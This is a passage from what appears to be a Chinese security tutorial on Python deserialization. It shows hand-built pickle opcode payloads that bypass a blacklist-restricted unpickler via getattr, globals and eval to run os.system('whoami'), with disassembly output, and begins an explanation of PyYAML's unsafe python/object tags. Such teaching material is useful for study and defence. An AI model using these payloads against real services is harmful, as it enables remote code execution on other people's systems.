class="hljs-string">i__builtin__</span><br><span class="hljs-string">dir</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">reversed</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">next</span><br><span class="hljs-string">S&#x27;111&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;key&#x27;</span> <span class="hljs-keyword">in</span> opcode:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;NoNoNo&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    pickle.loads(opcode)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;变量的值为:&quot;</span> + <span class="hljs-built_in">str</span>(secret.key))<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">变量的值为:123</span><br><span class="hljs-string">变量的值为:111</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="绕过builtins"><a href="#绕过builtins" class="headerlink" title="绕过builtins"></a>绕过builtins</h2><p>对于<a href="#b">上文</a>提到的重写find_class()方法来限制调用模块，如果采用的是黑名单的方式，那么就有可能绕过其限制</p><p>例如<a href="https://github.com/phith0n/code-breaking/tree/master/2018/picklecode">code-breaking 2018 picklecode</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> builtins<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br>    blacklist = &#123;<span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;execfile&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;input&#x27;</span>, <span class="hljs-string">&#x27;__import__&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>&#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-comment"># Only allow safe classes from builtins.</span><br>        <span class="hljs-keyword">if</span> module == <span class="hljs-string">&quot;builtins&quot;</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.blacklist:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(builtins, name)<br>        <span class="hljs-comment"># Forbid everything else.</span><br>        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %<br>                                     (module, name))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">restricted_loads</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()<br></code></pre></td></tr></table></figure><p>同样是限制了使用的模块只能为builtins，加上一个黑名单。但是我们可以利用<code>getattr</code>来获取一些黑名单函数，例如<code>builtins.getattr(&#39;builtins&#39;, &#39;eval&#39;)</code></p><p>转换成payload：<code>builtins.getattr(builtins, &#39;eval&#39;),(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,)</code></p><p>然后开始手搓opcode</p><p>首先调用builtins.getattr</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">cbuiltins<br><span class="hljs-built_in">getattr</span><br></code></pre></td></tr></table></figure><p>然后注意不能直接压入builtins，需要构造出一个builtins模块再来传给getattr</p><p>例如可以从<code>builtins.globals()</code>中拿到builtins模块，但是因为返回值是<code>&lt;class &#39;dict&#39;&gt;</code>，所以还需要一个<code>builtins.dict</code>中的get函数来取出<code>builtins</code></p><p>变换后的payload：<code>builtins.getattr(builtins.getattr(builtins.dict,&#39;get&#39;)(builtins.globals(),&#39;builtins&#39;),&#39;eval&#39;)(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,)</code></p><p>继续编写opcode</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#构造出get函数</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><br>opcode = <span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">dict</span><br><span class="hljs-string">S&#x27;get&#x27;</span><br><span class="hljs-string">tR.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>pickletools.dis(opcode)<br><span class="hljs-built_in">print</span>(pickle.loads(opcode))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    0: c    GLOBAL     &#x27;builtins getattr&#x27;</span><br><span class="hljs-string">   18: (    MARK</span><br><span class="hljs-string">   19: c        GLOBAL     &#x27;builtins dict&#x27;</span><br><span class="hljs-string">   34: S        STRING     &#x27;get&#x27;</span><br><span class="hljs-string">   41: t        TUPLE      (MARK at 18)</span><br><span class="hljs-string">   42: R    REDUCE</span><br><span class="hljs-string">   43: .    STOP</span><br><span class="hljs-string">highest protocol among opcodes = 0</span><br><span class="hljs-string">&lt;method &#x27;get&#x27; of &#x27;dict&#x27; objects&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 获取globals()字典</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><br>opcode = <span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">globals</span><br><span class="hljs-string">)R.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>pickletools.dis(opcode)<br><span class="hljs-built_in">print</span>(pickle.loads(opcode))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    0: c    GLOBAL     &#x27;builtins globals&#x27;</span><br><span class="hljs-string">   18: )    EMPTY_TUPLE</span><br><span class="hljs-string">   19: R    REDUCE</span><br><span class="hljs-string">   20: .    STOP</span><br><span class="hljs-string">highest protocol among opcodes = 1</span><br><span class="hljs-string">&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x000002490202C9D0&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;__file__&#x27;: &#x27;C:\\Users\\lewiserii\\Desktop\\test\\2.py&#x27;, &#x27;__cached__&#x27;: None, &#x27;pickle&#x27;: &lt;module &#x27;pickle&#x27; from &#x27;C:\\Python\\Python311\\Lib\\pickle.py&#x27;&gt;, &#x27;pickletools&#x27;: &lt;module &#x27;pickletools&#x27; from &#x27;C:\\Python\\Python311\\Lib\\pickletools.py&#x27;&gt;, &#x27;opcode&#x27;: b&#x27;cbuiltins\nglobals\n)R.\n&#x27;&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 组合get()和globals()字典，获取builtins模块</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><br>opcode = <span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">dict</span><br><span class="hljs-string">S&#x27;get&#x27;</span><br><span class="hljs-string">tR(cbuiltins</span><br><span class="hljs-string">globals</span><br><span class="hljs-string">)RS&#x27;__builtins__&#x27;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br><br>pickletools.dis(opcode)<br><span class="hljs-built_in">print</span>(pickle.loads(opcode))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    0: c    GLOBAL     &#x27;builtins getattr&#x27;</span><br><span class="hljs-string">   18: (    MARK</span><br><span class="hljs-string">   19: c        GLOBAL     &#x27;builtins dict&#x27;</span><br><span class="hljs-string">   34: S        STRING     &#x27;get&#x27;</span><br><span class="hljs-string">   41: t        TUPLE      (MARK at 18)</span><br><span class="hljs-string">   42: R    REDUCE</span><br><span class="hljs-string">   43: (    MARK</span><br><span class="hljs-string">   44: c        GLOBAL     &#x27;builtins globals&#x27;</span><br><span class="hljs-string">   62: )        EMPTY_TUPLE</span><br><span class="hljs-string">   63: R        REDUCE</span><br><span class="hljs-string">   64: S        STRING     &#x27;__builtins__&#x27;</span><br><span class="hljs-string">   80: t        TUPLE      (MARK at 43)</span><br><span class="hljs-string">   81: R    REDUCE</span><br><span class="hljs-string">   82: .    STOP</span><br><span class="hljs-string">highest protocol among opcodes = 1</span><br><span class="hljs-string">&lt;module &#x27;builtins&#x27; (built-in)&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 获取eval</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><br>opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">dict</span><br><span class="hljs-string">S&#x27;get&#x27;</span><br><span class="hljs-string">tR(cbuiltins</span><br><span class="hljs-string">globals</span><br><span class="hljs-string">)RS&#x27;__builtins__&#x27;</span><br><span class="hljs-string">tRS&#x27;eval&#x27;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br><br>pickletools.dis(opcode)<br><span class="hljs-built_in">print</span>(pickle.loads(opcode))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    0: c    GLOBAL     &#x27;builtins getattr&#x27;</span><br><span class="hljs-string">   18: (    MARK</span><br><span class="hljs-string">   19: c        GLOBAL     &#x27;builtins getattr&#x27;</span><br><span class="hljs-string">   37: (        MARK</span><br><span class="hljs-string">   38: c            GLOBAL     &#x27;builtins dict&#x27;</span><br><span class="hljs-string">   53: S            STRING     &#x27;get&#x27;</span><br><span class="hljs-string">   60: t            TUPLE      (MARK at 37)</span><br><span class="hljs-string">   61: R        REDUCE</span><br><span class="hljs-string">   62: (        MARK</span><br><span class="hljs-string">   63: c            GLOBAL     &#x27;builtins globals&#x27;</span><br><span class="hljs-string">   81: )            EMPTY_TUPLE</span><br><span class="hljs-string">   82: R            REDUCE</span><br><span class="hljs-string">   83: S            STRING     &#x27;__builtins__&#x27;</span><br><span class="hljs-string">   99: t            TUPLE      (MARK at 62)</span><br><span class="hljs-string">  100: R        REDUCE</span><br><span class="hljs-string">  101: S        STRING     &#x27;eval&#x27;</span><br><span class="hljs-string">  109: t        TUPLE      (MARK at 18)</span><br><span class="hljs-string">  110: R    REDUCE</span><br><span class="hljs-string">  111: .    STOP</span><br><span class="hljs-string">highest protocol among opcodes = 1</span><br><span class="hljs-string">&lt;built-in function eval&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 执行命令</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><br>opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">dict</span><br><span class="hljs-string">S&#x27;get&#x27;</span><br><span class="hljs-string">tR(cbuiltins</span><br><span class="hljs-string">globals</span><br><span class="hljs-string">)RS&#x27;__builtins__&#x27;</span><br><span class="hljs-string">tRS&#x27;eval&#x27;</span><br><span class="hljs-string">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span><br><span class="hljs-string">tR.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>pickletools.dis(opcode)<br><span class="hljs-built_in">print</span>(pickle.loads(opcode))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    0: c    GLOBAL     &#x27;builtins getattr&#x27;</span><br><span class="hljs-string">   18: (    MARK</span><br><span class="hljs-string">   19: c        GLOBAL     &#x27;builtins getattr&#x27;</span><br><span class="hljs-string">   37: (        MARK</span><br><span class="hljs-string">   38: c            GLOBAL     &#x27;builtins dict&#x27;</span><br><span class="hljs-string">   53: S            STRING     &#x27;get&#x27;</span><br><span class="hljs-string">   60: t            TUPLE      (MARK at 37)</span><br><span class="hljs-string">   61: R        REDUCE</span><br><span class="hljs-string">   62: (        MARK</span><br><span class="hljs-string">   63: c            GLOBAL     &#x27;builtins globals&#x27;</span><br><span class="hljs-string">   81: )            EMPTY_TUPLE</span><br><span class="hljs-string">   82: R            REDUCE</span><br><span class="hljs-string">   83: S            STRING     &#x27;__builtins__&#x27;</span><br><span class="hljs-string">   99: t            TUPLE      (MARK at 62)</span><br><span class="hljs-string">  100: R        REDUCE</span><br><span class="hljs-string">  101: S        STRING     &#x27;eval&#x27;</span><br><span class="hljs-string">  109: t        TUPLE      (MARK at 18)</span><br><span class="hljs-string">  110: R    REDUCE</span><br><span class="hljs-string">  111: (    MARK</span><br><span class="hljs-string">  112: S        STRING     &#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span><br><span class="hljs-string">  149: t        TUPLE      (MARK at 111)</span><br><span class="hljs-string">  150: R    REDUCE</span><br><span class="hljs-string">  151: .    STOP</span><br><span class="hljs-string">highest protocol among opcodes = 1</span><br><span class="hljs-string">lewiserii\lewiserii</span><br><span class="hljs-string">0</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 不使用R字节码</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><br>opcode = <span class="hljs-string">b&#x27;\x80\x03(cbuiltins\ngetattr\np0\ncbuiltins\ndict\np1\nX\x03\x00\x00\x00getop2\n0(g2\n(cbuiltins\nglobals\noX\x0C\x00\x00\x00__builtins__op3\n(g0\ng3\nX\x04\x00\x00\x00evalop4\n(g4\nX\x21\x00\x00\x00__import__(&quot;os&quot;).system(&quot;whoami&quot;)o00.&#x27;</span><br><br>pickletools.dis(pickletools.optimize(opcode))<br>pickle.loads(opcode)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    0: \x80 PROTO      3</span><br><span class="hljs-string">    2: (    MARK</span><br><span class="hljs-string">    3: c        GLOBAL     &#x27;builtins getattr&#x27;</span><br><span class="hljs-string">   21: q        BINPUT     0</span><br><span class="hljs-string">   23: c        GLOBAL     &#x27;builtins dict&#x27;</span><br><span class="hljs-string">   38: X        BINUNICODE &#x27;get&#x27;</span><br><span class="hljs-string">   46: o        OBJ        (MARK at 2)</span><br><span class="hljs-string">   47: q    BINPUT     1</span><br><span class="hljs-string">   49: 0    POP</span><br><span class="hljs-string">   50: (    MARK</span><br><span class="hljs-string">   51: h        BINGET     1</span><br><span class="hljs-string">   53: (        MARK</span><br><span class="hljs-string">   54: c            GLOBAL     &#x27;builtins globals&#x27;</span><br><span class="hljs-string">   72: o            OBJ        (MARK at 53)</span><br><span class="hljs-string">   73: X        BINUNICODE &#x27;__builtins__&#x27;</span><br><span class="hljs-string">   90: o        OBJ        (MARK at 50)</span><br><span class="hljs-string">   91: q    BINPUT     2</span><br><span class="hljs-string">   93: (    MARK</span><br><span class="hljs-string">   94: h        BINGET     0</span><br><span class="hljs-string">   96: h        BINGET     2</span><br><span class="hljs-string">   98: X        BINUNICODE &#x27;eval&#x27;</span><br><span class="hljs-string">  107: o        OBJ        (MARK at 93)</span><br><span class="hljs-string">  108: q    BINPUT     3</span><br><span class="hljs-string">  110: (    MARK</span><br><span class="hljs-string">  111: h        BINGET     3</span><br><span class="hljs-string">  113: X        BINUNICODE &#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span><br><span class="hljs-string">  151: o        OBJ        (MARK at 110)</span><br><span class="hljs-string">  152: 0    POP</span><br><span class="hljs-string">  153: 0    POP</span><br><span class="hljs-string">  154: .    STOP</span><br><span class="hljs-string">highest protocol among opcodes = 2</span><br><span class="hljs-string">lewiserii\lewiserii</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="opcode版本"><a href="#opcode版本" class="headerlink" title="opcode版本"></a>opcode版本</h2><p>有时可以通过改变opcode的版本来绕过一些对字母的过滤</p><p><img src="/img/summary/python_unserialize-8.png"></p><h1 id="PyYAML-反序列化"><a href="#PyYAML-反序列化" class="headerlink" title="PyYAML 反序列化"></a>PyYAML 反序列化</h1><h2 id="基础语法规则"><a href="#基础语法规则" class="headerlink" title="基础语法规则"></a>基础语法规则</h2><p>1：大小写敏感</p><p>2：使用空格代替tab键缩进表示层级，对齐即可表示同级</p><p>3：和python一样使用’#’注释内容</p><p>4：!!表示强制类型转换</p><p>5：一个 .yml 文件中可以有多份配置文件，用 — 隔开</p><p>更多的语法规则可以看<a href="https://pyyaml.org/wiki/PyYAMLDocumentation">官方手册</a>或<a href="https://www.runoob.com/w3cnote/yaml-intro.html">菜鸟教程</a>等</p><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><p>在PyYAML中，可以通过 <code>!!</code> 来进行类型转换</p><p><img src="/img/summary/python_unserialize-9.png"></p><p><code>site-packages/yaml/constructor.py</code>中可以看到基础的类型转换过程</p><p>例如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python2</span><br><span class="hljs-comment"># PyYAML4.2b4</span><br><span class="hljs-keyword">import</span> yaml<br>data = yaml.load(<span class="hljs-string">&#x27;!!str 111&#x27;</span>)<br><span class="hljs-built_in">print</span>(data)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(data))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">111</span><br><span class="hljs-string">&lt;type &#x27;str&#x27;&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>对应的代码如下，add_constructor定义了一些基础的类型转换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">SafeConstructor.add_constructor(<br>        <span class="hljs-string">u&#x27;tag:yaml.org,2002:str&#x27;</span>,<br>        SafeConstructor.construct_yaml_str)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_constructor</span>(<span class="hljs-params">cls, tag, constructor</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-string">&#x27;yaml_constructors&#x27;</span> <span class="hljs-keyword">in</span> cls.__dict__:<br>        cls.yaml_constructors = cls.yaml_constructors.copy()<br>    cls.yaml_constructors[tag] = constructor<br>add_constructor = <span class="hljs-built_in">classmethod</span>(add_constructor)<br></code></pre></td></tr></table></figure><p>str对应的函数是 construct_yaml_str，下断点分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">construct_yaml_str</span>(<span class="hljs-params">self, node</span>):<br>    value = self.construct_scalar(node)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> value.encode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>    <span class="hljs-keyword">except</span> UnicodeEncodeError:<br>        <span class="hljs-keyword">return</span> value<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">construct_scalar</span>(<span class="hljs-params">self, node</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(node, MappingNode):<br>        <span class="hljs-keyword">for</span> key_node, value_node <span class="hljs-keyword">in</span> node.value:<br>            <span class="hljs-keyword">if</span> key_node.tag == <span class="hljs-string">u&#x27;tag:yaml.org,2002:value&#x27;</span>:<br>                <span class="hljs-keyword">return</span> self.construct_scalar(value_node)<br>    <span class="hljs-keyword">return</span> BaseConstructor.construct_scalar(self, node)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">construct_scalar</span>(<span class="hljs-params">self, node</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(node, ScalarNode):<br>        <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>,<br>                <span class="hljs-string">&quot;expected a scalar node, but found %s&quot;</span> % node.<span class="hljs-built_in">id</span>,<br>                node.start_mark)<br>    <span class="hljs-keyword">return</span> node.value<br></code></pre></td></tr></table></figure><p>可以看到转换的过程，包括node的值</p><p><img src="/img/summary/python_unserialize-10.png"></p><p>当然除了<code>add_constructor</code>定义的基础类型外还有<code>add_multi_constructor</code>定义的5个complex python tag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">Constructor.add_multi_constructor(<br>    <span class="hljs-string">u&#x27;tag:yaml.org,2002:python/name:&#x27;</span>,<br>    Constructor.construct_python_name)<br><br>Constructor.add_multi_constructor(<br>    <span class="hljs-string">u&#x27;tag:yaml.org,2002:python/module:&#x27;</span>,<br>    Constructor.construct_python_module)<br><br>Constructor.add_multi_constructor(<br>    <span class="hljs-string">u&#x27;tag:yaml.org,2002:python/object:&#x27;</span>,<br>    Constructor.construct_python_object)<br><br>Constructor.add_multi_constructor(<br>    <span class="hljs-string">u&#x27;tag:yaml.org,2002:python/object/apply:&#x27;</span>,<br>    Constructor.construct_python_object_apply)<br><br>Constructor.add_multi_constructor(<br>    <span class="hljs-string">u&#x27;tag:yaml.org,2002:python/object/new:&#x27;</span>,<br>    Constructor.construct_python_object_new)<br></code></pre></td></tr></table></figure><p>根据图表可以看到这几个都可以引入新的模块，这正是 PyYAML 存在反序列化漏洞的原因</p><h2 id="PyYAML-lt-5-1"><a 